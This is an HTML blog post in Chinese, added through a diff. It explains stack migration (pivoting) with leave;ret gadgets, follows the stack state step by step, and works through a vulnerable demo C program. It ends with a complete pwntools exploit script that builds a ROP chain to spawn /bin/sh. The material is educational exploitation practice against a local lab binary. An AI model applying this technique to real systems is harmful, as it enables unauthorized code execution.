@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Stack migration(pivoting)
+Author: 堇姬Naup
+
+概念
+可輸入的 ROPchain 長度不夠時，可以擴展輸入的方法，將 ROPchain 分好幾次寫在指定的區域，最後再將 stack 移動過去執行
+如果找到其他地方有足夠空間放ROP，就可以用較少的gadget數，來"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Stack-Migration"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Stack migration(pivoting)
+Author: 堇姬Naup
+
+概念
+可輸入的 ROPchain 長度不夠時，可以擴展輸入的方法，將 ROPchain 分好幾次寫在指定的區域，最後再將 stack 移動過去執行
+如果找到其他地方有足夠空間放ROP，就可以用較少的gadget數，來"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<!-- Title -->
+
+<title>Stack-Migration | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Stack-Migration</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-05-21
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="Stack-migration-pivoting"><a href="#Stack-migration-pivoting" class="headerlink" title="Stack migration(pivoting)"></a>Stack migration(pivoting)</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
+<li>可輸入的 ROPchain 長度不夠時，可以擴展輸入的方法，將 ROPchain 分好幾次寫在指定的區域，最後再將 stack 移動過去執行</li>
+<li>如果找到其他地方有足夠空間放ROP，就可以用較少的gadget數，來將stack搬移至ROP位置，進行ROP</li>
+</ul>
+<h2 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h2><p>實際上做了兩件事</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="leave-ret"><a href="#leave-ret" class="headerlink" title="leave;ret"></a>leave;ret</h3><ul>
+<li>透過overflow將rbp填成ROP Chain開始位置address-8</li>
+<li>return address填入leave;ret 的gadget</li>
+</ul>
+<div class="img-item" data-src="/2024/05/21/Stack-Migration/Stack.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/Stack.png" class=""></div>
+
+<p>有一塊可以寫ROP gadget的地方</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*0x601090(這塊記憶體開始的位置)</span><br><span class="line">0xdeadbeef</span><br><span class="line">*0x601098(ROP開始的位置)</span><br><span class="line">pop rdi</span><br><span class="line">[&#x27;/bin/sh&#x27;]</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
+
+<p>stack狀態</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*0x10210&lt;-rsp</span><br><span class="line">stack</span><br><span class="line">*0x10200&lt;-rbp</span><br><span class="line">old rbp</span><br><span class="line">ret adress</span><br></pre></td></tr></table></figure>
+
+<p>填入payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*0x10210&lt;-rsp</span><br><span class="line">AAAAAAAA</span><br><span class="line">*0x10200&lt;-rbp</span><br><span class="line">0x601090(0x601098-0x8)</span><br><span class="line">leave;ret</span><br></pre></td></tr></table></figure>
+
+<p>首先一路執行下來<br>通常最後會有個</p>
+<div class="img-item" data-src="/2024/05/21/Stack-Migration/leavecommon.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/leavecommon.png" class=""></div>
+
+<p>leave;ret<br>而leave的意思是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure>
+<p>所以rsp會變成rbp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA</span><br><span class="line">*0x10200 &lt;- rbp,rsp</span><br><span class="line">0x601090(0x601098-0x8)</span><br><span class="line">leave;ret</span><br></pre></td></tr></table></figure>
+<p>之後pop rbp會讓stack第一個值推入rbp，也就是0x601090<br>所以rbp會指向那塊記憶體</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*0x601090 &lt;- rbp</span><br><span class="line">0xdeadbeef</span><br><span class="line">*0x601098(ROP開始的位置)</span><br><span class="line">pop rdi</span><br><span class="line">[&#x27;/bin/sh&#x27;]</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
+
+<p>之後ret，rsp往下指到leave;ret gadget前面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAA</span><br><span class="line">*0x10200</span><br><span class="line">0x601090(0x601098-0x8)</span><br><span class="line">*01018 &lt;- rsp</span><br><span class="line">leave;ret</span><br></pre></td></tr></table></figure>
+
+<p>接下來rsp繼續往下<br>在吃到一次leave，rsp會變成rbp，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*0x601090 &lt;- rbp,rsp</span><br><span class="line">0xdeadbeef</span><br><span class="line">*0x601098(ROP開始的位置)</span><br><span class="line">pop rdi</span><br><span class="line">[&#x27;/bin/sh&#x27;]</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
+<p>再來pop rbp，rbp指到遙遠的地方0xdeadbeef(總之就是設成這個值)<br>最後ret，rsp往下指</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*0x601090</span><br><span class="line">0xdeadbeef</span><br><span class="line">*0x601098(ROP開始的位置)&lt;-rsp</span><br><span class="line">pop rdi</span><br><span class="line">[&#x27;/bin/sh&#x27;]</span><br><span class="line">system</span><br></pre></td></tr></table></figure>
+<p>這樣就會開始執行ROP gadget了</p>
+<h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>開NX不能寫shellcode</p>
+<div class="img-item" data-src="/2024/05/21/Stack-Migration/checksec.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/checksec.png" class=""></div>
+
+<p>然後其實沒開canary</p>
+<div class="img-item" data-src="/2024/05/21/Stack-Migration/NOCANARY.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/NOCANARY.png" class=""></div>
+
+
+<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>\</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">0x80</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> s[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me your name: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, name, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me your ROP: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先name這塊區域夠大了，應該可以寫ROPgadget，另外s的部份太小了，要用stack migration來改rsp的位置</p>
+<div class="img-item" data-src="/2024/05/21/Stack-Migration/haveleave.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/haveleave.png" class=""></div>
+
+<p>另外最後有leave</p>
+<ul>
+<li>execve(‘&#x2F;bin&#x2F;sh’)</li>
+</ul>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>暫存器</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>rax</td>
+<td>0x3b</td>
+</tr>
+<tr>
+<td>rdi</td>
+<td>要執行的參數值(&#x2F;bin&#x2F;sh)</td>
+</tr>
+<tr>
+<td>rsi</td>
+<td>argv(這裡&#x3D;0)</td>
+</tr>
+<tr>
+<td>rdx</td>
+<td>envp(這裡&#x3D;0)</td>
+</tr>
+</tbody></table>
+<div class="table-responsive">
+<table class="table table-bordered table-striped">
+<thead>
+<tr>
+<th>gadget</th>
+<th>address</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pop rax ; ret</td>
+<td>0x4516c7</td>
+</tr>
+<tr>
+<td>pop rdi ; ret</td>
+<td>0x40186a</td>
+</tr>
+<tr>
+<td>pop rsi ; ret</td>
+<td>0x40f40e</td>
+</tr>
+<tr>
+<td>pop rdx ; ret</td>
+<td>0x40176f</td>
+</tr>
+<tr>
+<td>leave ; ret</td>
+<td>0x401dd0</td>
+</tr>
+<tr>
+<td>syscall</td>
+<td>0x4012d3</td>
+</tr>
+</tbody></table>
+<p>新rsp address-&gt;0x4c3300</p>
+<p>name</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*0x4c3300</span><br><span class="line">/bin/sh\x00</span><br><span class="line">pop rdi</span><br><span class="line">0x4c3300</span><br><span class="line">pop rax</span><br><span class="line">0x3b</span><br><span class="line">pop rsi</span><br><span class="line">0</span><br><span class="line">pop rdx</span><br><span class="line">0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+<p>s</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27;*0x10</span><br><span class="line">0x4c3300</span><br><span class="line">leave ; ret</span><br></pre></td></tr></table></figure>
+
+<p>這樣就可以讓rsp移到一塊大的記憶體來放ROPgadget，另外把也把&#x2F;bin&#x2F;sh放到這塊記憶體開頭這樣就可以抓到了<br>(可以按照上面的邏輯自己推一遍)</p>
+<h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">a=<span class="built_in">input</span>(<span class="string">&#x27;open debug?&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> a==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./demo_stack_pivoting&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ROPvar=&#123;</span><br><span class="line">    <span class="string">&#x27;pop_rax_ret&#x27;</span>:<span class="number">0x4516c7</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdi_ret&#x27;</span>:<span class="number">0x40186a</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rsi_ret&#x27;</span>:<span class="number">0x40f40e</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdx_ret&#x27;</span>:<span class="number">0x40176f</span>,</span><br><span class="line">    <span class="string">&#x27;leave_ret&#x27;</span>:<span class="number">0x401dd0</span>,</span><br><span class="line">    <span class="string">&#x27;syscall&#x27;</span>:<span class="number">0x4012d3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">STACKvar=&#123;</span><br><span class="line">    <span class="string">&#x27;rax_var&#x27;</span>:<span class="number">0x3b</span>,</span><br><span class="line">    <span class="string">&#x27;rdi_var&#x27;</span>:<span class="number">0x4c3300</span>,</span><br><span class="line">    <span class="string">&#x27;rsi_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;rdx_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;shell&#x27;</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name_payload=flat(STACKvar[<span class="string">&#x27;shell&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;pop_rdi_ret&#x27;</span>],</span><br><span class="line">                  STACKvar[<span class="string">&#x27;rdi_var&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;pop_rax_ret&#x27;</span>],</span><br><span class="line">                  STACKvar[<span class="string">&#x27;rax_var&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;pop_rsi_ret&#x27;</span>],</span><br><span class="line">                  STACKvar[<span class="string">&#x27;rsi_var&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;pop_rdx_ret&#x27;</span>],</span><br><span class="line">                  STACKvar[<span class="string">&#x27;rdx_var&#x27;</span>],</span><br><span class="line">                  ROPvar[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">s_payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x4c3300</span>)+p64(ROPvar[<span class="string">&#x27;leave_ret&#x27;</span>])</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Give me your name: &#x27;</span>,name_payload)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Give me your ROP: &#x27;</span>,s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">                     </span><br></pre></td></tr></table></figure>
+
+<div class="img-item" data-src="/2024/05/21/Stack-Migration/getshell.png" data-sub-html=".caption"><img src="/2024/05/21/Stack-Migration/getshell.png" class=""></div>
+
+<p>getshell!!!</p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/05/17/ROP-EZROP/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
